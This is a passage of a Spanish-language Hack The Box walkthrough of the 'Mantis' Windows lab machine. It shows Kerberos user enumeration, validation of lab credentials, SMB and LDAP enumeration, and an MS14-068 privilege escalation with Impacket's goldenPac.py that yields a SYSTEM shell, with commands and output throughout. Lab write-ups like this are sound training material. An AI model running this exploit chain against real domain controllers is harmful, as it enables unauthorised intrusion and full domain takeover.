+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p88</span> <span class="nt">--script</span><span class="o">=</span>krb5-enum-users <span class="nt">--script-args</span><span class="o">=</span>krb5-enum-users.realm<span class="o">=</span><span class="s1">'htb.local'</span>,userdb<span class="o">=</span>/opt/SecLists-master/Usernames/Names/names.txt 10.10.10.52 <span class="nt">-oN</span> kerberosUserEnum
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-19 20:40 CDT
+Nmap scan report <span class="k">for </span>10.10.10.52
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|_    james@htb.local
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>242.63 seconds
+</code></pre></div></div>
+
+<p>Tenemos un usuario potencial del dominio: <strong>james</strong> que de acuerdo con la base de datos, es el mismo y tenemos la contraseña.</p>
+
+<p>A partir de aquí, tenemos un juego de credenciales a probar; así que primero vamos a validarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.52 <span class="nt">-u</span> <span class="s1">'admin'</span> <span class="nt">-p</span> <span class="s1">'m$$ql_S@_P@ssW0rd!'</span>
+SMB         10.10.10.52     445    MANTIS           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 <span class="o">(</span>name:MANTIS<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.52     445    MANTIS           <span class="o">[</span>-] htb.local<span class="se">\a</span>dmin:m<span class="nv">$$</span>ql_S@_P@ssW0rd! STATUS_LOGON_FAILURE 
+❯ crackmapexec smb 10.10.10.52 <span class="nt">-u</span> <span class="s1">'james'</span> <span class="nt">-p</span> <span class="s1">'J@m3s_P@ssW0rd!'</span>
+SMB         10.10.10.52     445    MANTIS           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 <span class="o">(</span>name:MANTIS<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.52     445    MANTIS           <span class="o">[</span>+] htb.local<span class="se">\j</span>ames:J@m3s_P@ssW0rd!
+</code></pre></div></div>
+
+<p>Vemos un <strong>[+]</strong> para el usuario <strong>james</strong>. Asi que vamos a tratar de listar los recursos del servicio SMB con dichas credenciales:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.52 <span class="nt">-U</span> <span class="s1">'james%J@m3s_P@ssW0rd!'</span>
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        C<span class="nv">$ </span>             Disk      Default share
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<p>Vemos los recursos <code class="language-plaintext highlighter-rouge">NETLOGON</code> y <code class="language-plaintext highlighter-rouge">SYSVOL</code>. Aqui deberíamos estar pensando en el archivo <strong>Group_._xml</strong> alojando en la carpeta <code class="language-plaintext highlighter-rouge">SYSVOL</code>; así que primero nos instalamos <code class="language-plaintext highlighter-rouge">apt-get install cifs-utils</code> y creamos una montura en nuestro equipo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mount <span class="nt">-t</span> cifs //10.10.10.52/SYSVOL /mnt/smbmnt/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span><span class="s1">'james'</span>,password<span class="o">=</span><span class="s1">'J@m3s_P@ssW0rd!'</span>,domain<span class="o">=</span>WORKGROUP,rw
+</code></pre></div></div>
+
+<p>Ya nos creamos la montura y podemos visualizar los recursos de <code class="language-plaintext highlighter-rouge">/mnt/smbmnt</code> de una formas más rápida con el comando <code class="language-plaintext highlighter-rouge">tree</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tree /mnt/smbmnt/
+/mnt/smbmnt/
+└── htb.local
+    ├── DfsrPrivate
+    ├── Policies
+    │   ├── <span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
+    │   │   ├── GPT.INI
+    │   │   ├── MACHINE
+    │   │   │   ├── Microsoft
+    │   │   │   │   └── Windows NT
+    │   │   │   │       └── SecEdit
+    │   │   │   │           └── GptTmpl.inf
+    │   │   │   └── Registry.pol
+    │   │   └── USER
+    │   └── <span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>
+    │       ├── GPT.INI
+    │       ├── MACHINE
+    │       │   └── Microsoft
+    │       │       └── Windows NT
+    │       │           └── SecEdit
+    │       │               └── GptTmpl.inf
+    │       └── USER
+    └── scripts
+
+16 directories, 5 files
+</code></pre></div></div>
+
+<p>No vemos nada interesante, así que nos quitamos la montura. Podemos probar a listar uusarios del dominio con <code class="language-plaintext highlighter-rouge">rpcclient</code> proporcionándole las credenciales que tenemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s1">'james%J@m3s_P@ssW0rd!'</span> 10.10.10.52 <span class="nt">-c</span> <span class="s2">"enumdomusers"</span>
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[james] rid:[0x44f]
+</code></pre></div></div>
+
+<p>Podemos listar usuarios del dominio. Para tener la información en un formato más bonito y mas claro; nos instalamos la siguiente utilidad:</p>
+
+<p><a href="https://github.com/dirkjanm/ldapdomaindump">LDAPDomainDump</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ldapdomaindump <span class="nt">-u</span> <span class="s1">'WORKGROUP\james'</span> <span class="nt">-p</span> <span class="s1">'J@m3s_P@ssW0rd!'</span> <span class="nt">-o</span> /var/www/html/ 10.10.10.52
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to host...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Binding to host
+<span class="o">[</span>+] Bind OK
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting domain dump
+<span class="o">[</span>+] Domain dump finished
+</code></pre></div></div>
+
+<p>Ahora desde el navegador consultado <code class="language-plaintext highlighter-rouge">localhost</code> y vemos una serie de archivos, aquellos con extensión <code class="language-plaintext highlighter-rouge">html</code> nos representa la información en un formato amigable sobre el dominio:</p>
+
+<p><img src="/assets/images/htb-mantis/mantis_dominio.png" alt="" /></p>
+
+<p>Como podemos ver, el unico usuario dentro del grupo <strong>Administrators</strong> es el usuario <strong>Administrator</strong>; nosotros como el usuario <strong>james</strong>, estamos en el grupo <strong>Remote Desktop Users</strong>, pero no tenemos el servicio RDP visible. En este punto, investigando un poco, vemos que exite una vulnerabilidad descrita en <strong>MS14-068</strong> que nos permitiría elevar privilegios de manera que el usuario <strong>james</strong> pueda tener los privilegios máximos:</p>
+
+<p><img src="/assets/images/htb-mantis/mantis_kerberos.png" alt="" /></p>
+
+<p>Asi que primero vamos a agregar en nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> los dominios relacionados con la dirección IP de la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /etc/hosts
+───────┬────────────────────────────────────────────────────────────────────────
+       │ File: /etc/hosts
+───────┼────────────────────────────────────────────────────────────────────────
+   1   │ <span class="c"># Host addresses</span>
+   2   │ 127.0.0.1  localhost
+   3   │ 127.0.1.1  k4mipc
+   4   │ 10.10.10.52 htb.local mantis.htb.local
+   5   │ 
+   6   │ ::1        localhost ip6-localhost ip6-loopback
+   7   │ ff02::1    ip6-allnodes
+   8   │ ff02::2    ip6-allrouters
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ goldenPac.py htb.local/<span class="s1">'james:J@m3s_P@ssW0rd!'</span>@mantis.htb.local
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attacking domain controller mantis.htb.local
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mantis.htb.local found vulnerable!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on mantis.htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file lPDhopUm.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on mantis.htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service MYLV on mantis.htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service MYLV.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya ingresamos a la máquina como el usuario <strong><em>nt authority\system</em></strong> y podemos visualizar las flags (user.txt y root.txt).9</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active_Directory</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#patch-management" class="page__taxonomy-item" rel="tag">Patch_Management</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hard" class="page__taxonomy-item" rel="tag">Hard</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-19T00:00:00-05:00">September 19, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-olympus/" class="pagination--pager" title="Hack The Box Olympus
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
